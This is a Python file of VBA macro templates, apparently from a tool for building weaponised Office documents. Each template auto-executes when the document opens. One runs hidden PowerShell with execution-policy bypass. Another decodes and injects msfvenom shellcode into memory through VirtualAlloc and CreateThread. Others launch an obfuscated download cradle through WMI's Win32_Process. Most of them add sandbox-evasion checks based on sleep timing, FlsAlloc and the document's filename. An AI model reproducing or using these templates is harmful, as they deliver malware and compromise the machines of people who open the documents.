template_vba_basic = """
Sub MyMacro()
    Dim str As String
    str = "powershell -nop -exec bypass -c ping.exe IPADDR"
    Shell str, vbHide
End Sub

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

template_vba_default = """Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Sub Sleep Lib "KERNEL32" (ByVal dwMilliseconds As Long)
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim tmp As LongPtr
    
    t1 = Now()
    Sleep (4000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3.5 Then
        Exit Function
    End If

    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If

    If ActiveDocument.Name <> FILENAME Then
        Exit Function
    End If

    ' MSFVENOM
    SHELLCODE

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 17
    Next i

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("t")
    Next i

        For i = 0 To UBound(buf)
        buf(i) = buf(i) - 5
    Next i

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("y")
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

template_vba_ps_default = """Private Declare PtrSafe Sub Sleep Lib "KERNEL32" (ByVal dwMilliseconds As Long)
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim tmp As LongPtr
    
    t1 = Now()
    Sleep (4000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3.5 Then
        Exit Function
    End If

    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If

    If ActiveDocument.Name <> FILENAME Then
        Exit Function
    End If

    Apples = "CRADLE"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

template_vba_ps_multi = """Private Declare PtrSafe Sub Sleep Lib "KERNEL32" (ByVal dwMilliseconds As Long)
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim tmp As LongPtr
    Dim Appletree As Variant
    
    t1 = Now()
    Sleep (4000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3.5 Then
        Exit Function
    End If

    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If

    If ActiveDocument.Name <> FILENAME Then
        Exit Function
    End If

    Appletree = Array(CRADLE)
    For i = LBound(Appletree) To UBound(Appletree)
        Apples = Appletree(i)
        Water = Nuts(Apples)
        GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
    Next i

End Function

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

templates_dict = {
    "vba": {"basic": template_vba_basic, "default": template_vba_default},
    "vba-ps": {
        "default": template_vba_ps_default,
        "run": template_vba_ps_multi,
    },
}
